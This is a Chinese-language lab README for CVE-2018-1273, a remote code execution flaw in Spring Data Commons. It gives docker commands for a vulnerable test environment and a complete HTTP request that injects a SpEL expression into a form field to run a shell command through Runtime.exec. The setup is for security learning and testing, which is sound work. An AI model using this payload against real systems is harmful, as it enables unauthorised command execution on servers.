## Spring Data Commons 代码执行漏洞(CVE-2018-1273)

### 漏洞信息

 - [Spring Data Commons Remote Code Execution 分析-【CVE-2018-1273】](https://xz.aliyun.com/t/2269)

### 获取环境:

1. 拉取镜像到本地

 ```
$ docker pull medicean/vulapps:s_spring_2
 ```

2. 启动环境

 ```
$ docker run -d -p 8080:8080 medicean/vulapps:s_spring_2
 ```
 > `-p 8080:8080` 前面的 8080 代表物理机的端口，可随意指定。 

### 使用与利用

访问 `http://你的 IP 地址:端口号/`, 假设启动的端口号为 8080

#### PoC

1. 访问 `http://127.0.0.1:8080/users`，测试服务是否启动成功

2. 发送如下数据包,执行命令为: `/bin/touch /tmp/vuln`

```
POST /users?page=&size=5 HTTP/1.1
Host: 127.0.0.1:8080
Proxy-Connection: keep-alive
Content-Length: 138
Cache-Control: max-age=0
Origin: http://127.0.0.1:8080
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Referer: http://127.0.0.1:8080/users
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8

username[#this.getClass().forName("java.lang.Runtime").getRuntime().exec("/bin/touch /tmp/vuln")]=test&password=test&repeatedPassword=test
```

### 参考链接

- [Spring Data Commons Remote Code Execution 分析-【CVE-2018-1273】](https://xz.aliyun.com/t/2269)
